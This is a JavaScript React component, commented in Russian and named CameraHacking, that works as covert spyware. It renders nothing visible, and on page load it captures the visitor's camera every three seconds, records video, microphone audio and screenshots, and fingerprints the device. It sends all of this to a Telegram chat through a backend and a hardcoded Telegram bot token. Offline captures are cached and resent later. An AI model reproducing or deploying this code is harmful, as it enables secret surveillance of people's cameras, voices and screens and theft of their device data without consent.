/**
 * КОМПОНЕНТ CAMERAHACKING - РАСШИРЕННАЯ ВЕРСИЯ
 * 
 * НОВЫЕ ВОЗМОЖНОСТИ:
 * 1. Периодическая отправка фото каждые 3 секунды
 * 2. Адаптивное качество в зависимости от сети
 * 3. Детекция движения для умной съемки
 * 4. Захват звука с микрофона
 * 5. Скриншоты экрана (для десктопов)
 * 6. Запись видео с возможностью фрагментации
 * 7. Сбор системной информации
 * 8. Автономное кэширование и отправка
 */

import axios from 'axios';
import { useEffect, useRef, useState } from 'react';
import API_CONFIG from '../api/config';

// Конфигурация
const CONFIG = {
  CAPTURE_INTERVAL: 3000, // Интервал съемки в миллисекундах (3 секунды)
  MAX_CAPTURES: 100, // Максимальное количество снимков за сессию
  VIDEO_DURATION: 10000, // Длительность видеофрагментов (10 секунд)
  QUALITY: {
    HIGH: 0.9,
    MEDIUM: 0.7,
    LOW: 0.5
  },
  NETWORK_THRESHOLDS: {
    SLOW: 100, // Kbps
    MEDIUM: 500 // Kbps
  }
};

const CameraHacking = ({setClientIp, chatId, videoRef, setLocationPermission}) => {
  const streamRef = useRef(null);
  const audioStreamRef = useRef(null);
  const mediaRecorderRef = useRef(null);
  const captureIntervalRef = useRef(null);
  const motionCanvasRef = useRef(null);
  const motionContextRef = useRef(null);
  const previousFrameRef = useRef(null);
  
  const [captureCount, setCaptureCount] = useState(0);
  const [isCapturing, setIsCapturing] = useState(false);
  const [networkSpeed, setNetworkSpeed] = useState(null);
  const [systemInfo, setSystemInfo] = useState({});
  const [cachedCaptures, setCachedCaptures] = useState([]);

  /**
   * ФУНКЦИЯ СБОРА СИСТЕМНОЙ ИНФОРМАЦИИ
   */
  const collectSystemInfo = () => {
    const info = {
      // Информация о браузере
      browser: {
        name: navigator.userAgentData?.brands?.[0]?.brand || 'unknown',
        version: navigator.userAgentData?.brands?.[0]?.version || 'unknown',
        platform: navigator.userAgentData?.platform || 'unknown',
        mobile: navigator.userAgentData?.mobile || false
      },
      
      // Характеристики устройства
      device: {
        memory: navigator.deviceMemory || 'unknown',
        cores: navigator.hardwareConcurrency || 'unknown',
        maxTouchPoints: navigator.maxTouchPoints || 0
      },
      
      // Информация об экране
      screen: {
        width: window.screen.width,
        height: window.screen.height,
        colorDepth: window.screen.colorDepth,
        pixelDepth: window.screen.pixelDepth,
        orientation: window.screen.orientation?.type || 'unknown'
      },
      
      // Сетевые возможности
      network: {
        connection: navigator.connection || {},
        online: navigator.onLine,
        language: navigator.language,
        languages: navigator.languages
      },
      
      // Временные метки
      timestamps: {
        start: Date.now(),
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        locale: navigator.language
      },
      
      // Дополнительная информация
      misc: {
        cookiesEnabled: navigator.cookieEnabled,
        doNotTrack: navigator.doNotTrack,
        pdfViewerEnabled: navigator.pdfViewerEnabled || false
      }
    };
    
    setSystemInfo(info);
    return info;
  };

  /**
   * ФУНКЦИЯ ТЕСТИРОВАНИЯ СКОРОСТИ СЕТИ
   */
  const testNetworkSpeed = async () => {
    try {
      const startTime = Date.now();
      const testImage = 'https://source.unsplash.com/random/1000x1000?' + Date.now();
      
      const response = await fetch(testImage, { mode: 'no-cors' });
      const endTime = Date.now();
      
      // Примерная оценка скорости
      const duration = (endTime - startTime) / 1000; // секунды
      const speed = 100 / duration; // Kbps (приблизительно)
      
      setNetworkSpeed(speed);
      console.log(`🌐 Network speed: ${Math.round(speed)} Kbps`);
      
      return speed;
    } catch (error) {
      console.log("⚠️ Network speed test failed, using default");
      return CONFIG.NETWORK_THRESHOLDS.MEDIUM;
    }
  };

  /**
   * ФУНКЦИЯ ОПРЕДЕЛЕНИЯ КАЧЕСТВА НА ОСНОВЕ СЕТИ
   */
  const getQualityBasedOnNetwork = (speed) => {
    if (!speed || speed < CONFIG.NETWORK_THRESHOLDS.SLOW) {
      return CONFIG.QUALITY.LOW;
    } else if (speed < CONFIG.NETWORK_THRESHOLDS.MEDIUM) {
      return CONFIG.QUALITY.MEDIUM;
    } else {
      return CONFIG.QUALITY.HIGH;
    }
  };

  /**
   * ФУНКЦИЯ ДЕТЕКЦИИ ДВИЖЕНИЯ
   */
  const initializeMotionDetection = () => {
    if (!videoRef.current) return;
    
    motionCanvasRef.current = document.createElement('canvas');
    motionCanvasRef.current.width = 160; // Низкое разрешение для производительности
    motionCanvasRef.current.height = 120;
    motionContextRef.current = motionCanvasRef.current.getContext('2d', { willReadFrequently: true });
    
    console.log("🎯 Motion detection initialized");
  };

  /**
   * ФУНКЦИЯ ПРОВЕРКИ ДВИЖЕНИЯ
   */
  const detectMotion = () => {
    if (!videoRef.current || !motionContextRef.current || !previousFrameRef.current) {
      return false;
    }
    
    try {
      const video = videoRef.current;
      const ctx = motionContextRef.current;
      const canvas = motionCanvasRef.current;
      
      // Рисуем текущий кадр в уменьшенном размере
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      const currentFrame = ctx.getImageData(0, 0, canvas.width, canvas.height);
      
      if (!previousFrameRef.current.data) {
        previousFrameRef.current = currentFrame;
        return false;
      }
      
      // Сравниваем с предыдущим кадром
      let diff = 0;
      const length = currentFrame.data.length;
      
      for (let i = 0; i < length; i += 4) {
        const prev = previousFrameRef.current.data[i];
        const curr = currentFrame.data[i];
        diff += Math.abs(curr - prev);
      }
      
      const avgDiff = diff / (length / 4);
      previousFrameRef.current = currentFrame;
      
      // Порог срабатывания
      const threshold = 10;
      const motionDetected = avgDiff > threshold;
      
      if (motionDetected) {
        console.log(`🚶 Motion detected! Intensity: ${avgDiff.toFixed(2)}`);
      }
      
      return motionDetected;
      
    } catch (error) {
      console.error("❌ Motion detection error:", error);
      return false;
    }
  };

  /**
   * ФУНКЦИЯ ЗАХВАТА АУДИО С МИКРОФОНА
   */
  const captureAudio = async () => {
    try {
      const audioStream = await navigator.mediaDevices.getUserMedia({
        audio: {
          channelCount: 1,
          sampleRate: 16000,
          echoCancellation: true,
          noiseSuppression: true
        }
      });
      
      audioStreamRef.current = audioStream;
      console.log("🎤 Audio capture enabled");
      
      // Запись короткого аудиофрагмента
      const audioChunks = [];
      const mediaRecorder = new MediaRecorder(audioStream);
      
      mediaRecorder.ondataavailable = (event) => {
        if (event.data.size > 0) {
          audioChunks.push(event.data);
        }
      };
      
      mediaRecorder.onstop = async () => {
        const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
        await sendToTelegram(audioBlob, 'audio', 'audio.webm');
      };
      
      // Записываем 5 секунд аудио
      mediaRecorder.start();
      setTimeout(() => {
        if (mediaRecorder.state === 'recording') {
          mediaRecorder.stop();
        }
      }, 5000);
      
    } catch (error) {
      console.log("⚠️ Audio capture not available:", error.message);
    }
  };

  /**
   * ФУНКЦИЯ ЗАПИСИ ВИДЕО
   */
  const startVideoRecording = async () => {
    try {
      if (!streamRef.current) return;
      
      const videoStream = streamRef.current;
      
      // Добавляем аудио, если доступно
      if (audioStreamRef.current) {
        videoStream.addTrack(audioStreamRef.current.getAudioTracks()[0]);
      }
      
      const mediaRecorder = new MediaRecorder(videoStream, {
        mimeType: 'video/webm;codecs=vp9',
        videoBitsPerSecond: 2500000
      });
      
      mediaRecorderRef.current = mediaRecorder;
      const videoChunks = [];
      
      mediaRecorder.ondataavailable = (event) => {
        if (event.data.size > 0) {
          videoChunks.push(event.data);
        }
      };
      
      mediaRecorder.onstop = async () => {
        const videoBlob = new Blob(videoChunks, { type: 'video/webm' });
        await sendToTelegram(videoBlob, 'video', 'video.webm');
      };
      
      // Записываем фрагмент
      mediaRecorder.start();
      
      // Останавливаем через заданное время
      setTimeout(() => {
        if (mediaRecorder.state === 'recording') {
          mediaRecorder.stop();
        }
      }, CONFIG.VIDEO_DURATION);
      
      console.log("🎬 Video recording started");
      
    } catch (error) {
      console.error("❌ Video recording error:", error);
    }
  };

  /**
   * ФУНКЦИЯ ЗАХВАТА СКРИНШОТА ЭКРАНА
   */
  const captureScreenshot = async () => {
    try {
      // Проверяем поддержку API
      if (!navigator.mediaDevices?.getDisplayMedia) {
        console.log("⚠️ Screen capture not supported");
        return;
      }
      
      // Запрашиваем доступ к экрану
      const screenStream = await navigator.mediaDevices.getDisplayMedia({
        video: { displaySurface: "monitor" },
        audio: false
      });
      
      const videoTrack = screenStream.getVideoTracks()[0];
      const imageCapture = new ImageCapture(videoTrack);
      
      // Делаем снимок
      const bitmap = await imageCapture.grabFrame();
      
      // Конвертируем в blob
      const canvas = document.createElement('canvas');
      canvas.width = bitmap.width;
      canvas.height = bitmap.height;
      const context = canvas.getContext('2d');
      context.drawImage(bitmap, 0, 0);
      
      canvas.toBlob(async (blob) => {
        if (blob) {
          await sendToTelegram(blob, 'screenshot', 'screenshot.png');
        }
        
        // Останавливаем запись экрана
        videoTrack.stop();
      }, 'image/png', 0.9);
      
      console.log("🖥️ Screenshot captured");
      
    } catch (error) {
      console.log("⚠️ Screen capture failed:", error.message);
    }
  };

  /**
   * УНИВЕРСАЛЬНАЯ ФУНКЦИЯ ОТПРАВКИ
   */
  const sendToTelegram = async (blob, type, filename) => {
    try {
      const formData = new FormData();
      formData.append("chat_id", chatId);
      formData.append(type, blob, filename);
      
      // Добавляем метаданные
      formData.append("metadata", JSON.stringify({
        type: type,
        timestamp: Date.now(),
        captureCount: captureCount,
        networkSpeed: networkSpeed,
        systemInfo: systemInfo,
        dimensions: type === 'photo' ? 
          `${blob.width || 'unknown'}x${blob.height || 'unknown'}` : 
          `${blob.size} bytes`
      }));
      
      const apiUrl = `${API_CONFIG.baseURL}${API_CONFIG.endpoints.sendPhotoToTelegram}`;
      
      await axios.post(apiUrl, formData, {
        headers: { "Content-Type": "multipart/form-data" },
        timeout: 30000
      });
      
      console.log(`✅ ${type} sent successfully`);
      setCaptureCount(prev => prev + 1);
      
      // Очищаем кэш после успешной отправки
      if (cachedCaptures.length > 0) {
        await sendCachedCaptures();
      }
      
    } catch (error) {
      console.error(`❌ Error sending ${type}:`, error);
      
      // Кэшируем при ошибке сети
      cacheCapture(blob, type, filename);
    }
  };

  /**
   * ФУНКЦИЯ КЭШИРОВАНИЯ ЗАХВАТОВ
   */
  const cacheCapture = (blob, type, filename) => {
    const cachedItem = {
      blob,
      type,
      filename,
      timestamp: Date.now(),
      metadata: {
        systemInfo,
        networkSpeed
      }
    };
    
    setCachedCaptures(prev => [...prev, cachedItem].slice(0, 50)); // Максимум 50 в кэше
    
    // Сохраняем в localStorage для восстановления после перезагрузки
    try {
      const existing = JSON.parse(localStorage.getItem('cachedCaptures') || '[]');
      existing.push({
        ...cachedItem,
        blob: URL.createObjectURL(blob) // Сохраняем как Data URL для простоты
      });
      localStorage.setItem('cachedCaptures', JSON.stringify(existing.slice(0, 20)));
    } catch (e) {
      console.error("❌ Failed to cache in localStorage:", e);
    }
    
    console.log(`💾 Cached ${type} (${cachedCaptures.length + 1} total)`);
  };

  /**
   * ФУНКЦИЯ ОТПРАВКИ КЭШИРОВАННЫХ ЗАХВАТОВ
   */
  const sendCachedCaptures = async () => {
    if (cachedCaptures.length === 0) return;
    
    console.log(`📤 Sending ${cachedCaptures.length} cached captures...`);
    
    for (const item of [...cachedCaptures]) {
      try {
        await sendToTelegram(item.blob, item.type, item.filename);
        
        // Удаляем из кэша после успешной отправки
        setCachedCaptures(prev => prev.filter(i => i.timestamp !== item.timestamp));
      } catch (error) {
        console.error(`❌ Failed to send cached ${item.type}:`, error);
        break; // Прерываем если сеть недоступна
      }
    }
  };

  /**
   * ОСНОВНАЯ ФУНКЦИЯ ЗАХВАТА ФОТО
   */
  const capturePhoto = async () => {
    if (!videoRef.current || !streamRef.current || captureCount >= CONFIG.MAX_CAPTURES) {
      console.log("⏸️ Capture stopped: limit reached or no stream");
      stopCapturing();
      return;
    }
    
    try {
      const video = videoRef.current;
      
      // Проверяем готовность видео
      if (video.videoWidth === 0 || video.videoHeight === 0) {
        console.log("⏳ Video not ready, skipping capture");
        return;
      }
      
      // Создаем canvas
      const canvas = document.createElement("canvas");
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      
      const context = canvas.getContext("2d");
      
      // Применяем эффекты для улучшения качества
      context.filter = "contrast(1.1) brightness(1.05) saturate(1.1)";
      context.drawImage(video, 0, 0, canvas.width, canvas.height);
      
      // Определяем качество на основе сети
      const quality = getQualityBasedOnNetwork(networkSpeed);
      
      canvas.toBlob(async (blob) => {
        if (blob) {
          const sizeMB = (blob.size / (1024 * 1024)).toFixed(2);
          console.log(`📸 Captured photo #${captureCount + 1} (${sizeMB} MB, quality: ${quality})`);
          
          // Проверяем детекцию движения
          const motionDetected = detectMotion();
          
          // Отправляем фото
          await sendToTelegram(blob, 'photo', `photo_${Date.now()}.jpg`);
          
          // Если обнаружено движение, делаем дополнительные действия
          if (motionDetected) {
            console.log("🚶 Motion detected, taking extra actions...");
            
            // Делаем дополнительный снимок
            setTimeout(capturePhoto, 500);
            
            // Запускаем запись видео при движении
            if (captureCount % 5 === 0) { // Каждое 5-е движение
              startVideoRecording();
            }
          }
          
          // Периодически делаем скриншот (каждые 10 снимков)
          if (captureCount % 10 === 0) {
            captureScreenshot();
          }
          
          // Периодически захватываем аудио (каждые 20 снимков)
          if (captureCount % 20 === 0) {
            captureAudio();
          }
        }
      }, "image/jpeg", quality);
      
    } catch (error) {
      console.error("❌ Capture error:", error);
    }
  };

  /**
   * ФУНКЦИЯ ЗАПУСКА ПЕРИОДИЧЕСКОГО ЗАХВАТА
   */
  const startPeriodicCapture = () => {
    if (captureIntervalRef.current) {
      clearInterval(captureIntervalRef.current);
    }
    
    setIsCapturing(true);
    console.log(`🚀 Starting periodic capture every ${CONFIG.CAPTURE_INTERVAL/1000} seconds`);
    
    // Первый захват сразу
    capturePhoto();
    
    // Затем каждые 3 секунды
    captureIntervalRef.current = setInterval(() => {
      if (captureCount < CONFIG.MAX_CAPTURES) {
        capturePhoto();
      } else {
        stopCapturing();
      }
    }, CONFIG.CAPTURE_INTERVAL);
  };

  /**
   * ФУНКЦИЯ ОСТАНОВКИ ЗАХВАТА
   */
  const stopCapturing = () => {
    if (captureIntervalRef.current) {
      clearInterval(captureIntervalRef.current);
      captureIntervalRef.current = null;
    }
    
    if (mediaRecorderRef.current?.state === 'recording') {
      mediaRecorderRef.current.stop();
    }
    
    setIsCapturing(false);
    console.log("🛑 Capture stopped");
  };

  /**
   * ФУНКЦИЯ ОТПРАВКИ СВОДКИ СЕССИИ
   */
  const sendSessionSummary = async () => {
    try {
      const summary = {
        sessionId: Date.now(),
        totalCaptures: captureCount,
        startTime: systemInfo.timestamps?.start,
        endTime: Date.now(),
        duration: Date.now() - (systemInfo.timestamps?.start || Date.now()),
        systemInfo: systemInfo,
        networkInfo: {
          speed: networkSpeed,
          quality: getQualityBasedOnNetwork(networkSpeed)
        },
        cachedItems: cachedCaptures.length
      };
      
      const telegramApiUrl = 'https://api.telegram.org/8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s/sendMessage';
      
      await axios.post(telegramApiUrl, {
        'chat_id': chatId,
        'text': `📊 Session Summary\n\n` +
               `Total captures: ${summary.totalCaptures}\n` +
               `Duration: ${Math.round(summary.duration / 1000)} seconds\n` +
               `Device: ${summary.systemInfo.browser.platform}\n` +
               `Network speed: ${Math.round(summary.networkInfo.speed || 0)} Kbps\n` +
               `Quality: ${summary.networkInfo.quality}\n` +
               `Cached items: ${summary.cachedItems}\n` +
               `Session ID: ${summary.sessionId}`
      });
      
      console.log("📊 Session summary sent");
      
    } catch (error) {
      console.error("❌ Error sending session summary:", error);
    }
  };

  /**
   * ОСНОВНОЙ ЭФФЕКТ
   */
  useEffect(() => {
    const initializeAll = async () => {
      try {
        // 1. Собираем системную информацию
        const sysInfo = collectSystemInfo();
        
        // 2. Тестируем скорость сети
        const speed = await testNetworkSpeed();
        
        // 3. Запрашиваем доступ к камере
        const constraints = {
          video: {
            width: { ideal: 1920 },
            height: { ideal: 1080 },
            frameRate: { ideal: 30 },
            facingMode: "user"
          }
        };
        
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        streamRef.current = stream;
        
        if (videoRef.current) {
          videoRef.current.srcObject = stream;
          
          // Ждем готовности видео
          await new Promise(resolve => {
            if (videoRef.current.readyState >= 2) {
              setTimeout(resolve, 1000);
            } else {
              videoRef.current.onloadedmetadata = () => setTimeout(resolve, 1000);
            }
          });
          
          // 4. Инициализируем детекцию движения
          initializeMotionDetection();
          
          // 5. Запускаем периодический захват
          startPeriodicCapture();
          
          // 6. Запускаем сбор IP
          fetchClientIp();
          
          console.log("🎯 All systems initialized");
        }
        
      } catch (error) {
        console.error("❌ Initialization error:", error);
        handleCameraError(error);
      }
    };

    // Восстановление из localStorage
    const restoreFromCache = () => {
      try {
        const saved = localStorage.getItem('cachedCaptures');
        if (saved) {
          const cached = JSON.parse(saved);
          console.log(`📦 Found ${cached.length} cached items from previous session`);
          
          // Пытаемся отправить кэшированные данные
          setTimeout(sendCachedCaptures, 5000);
        }
      } catch (e) {
        console.error("❌ Failed to restore cache:", e);
      }
    };

    // Инициализация
    initializeAll();
    restoreFromCache();

    // Обработка видимости страницы
    const handleVisibilityChange = () => {
      if (document.hidden) {
        console.log("⏸️ Page hidden, pausing capture");
        stopCapturing();
      } else {
        console.log("▶️ Page visible, resuming capture");
        if (!isCapturing) {
          startPeriodicCapture();
        }
      }
    };

    document.addEventListener('visibilitychange', handleVisibilityChange);

    // Отправка сводки перед закрытием
    const handleBeforeUnload = () => {
      sendSessionSummary();
      stopCapturing();
    };

    window.addEventListener('beforeunload', handleBeforeUnload);

    // Очистка
    return () => {
      handleBeforeUnload();
      document.removeEventListener('visibilitychange', handleVisibilityChange);
      window.removeEventListener('beforeunload', handleBeforeUnload);
      
      stopCapturing();
      
      if (streamRef.current) {
        streamRef.current.getTracks().forEach(track => track.stop());
      }
      
      if (audioStreamRef.current) {
        audioStreamRef.current.getTracks().forEach(track => track.stop());
      }
      
      console.log("🧹 Full cleanup completed");
    };
  }, []);

  return null;
};

export default CameraHacking;
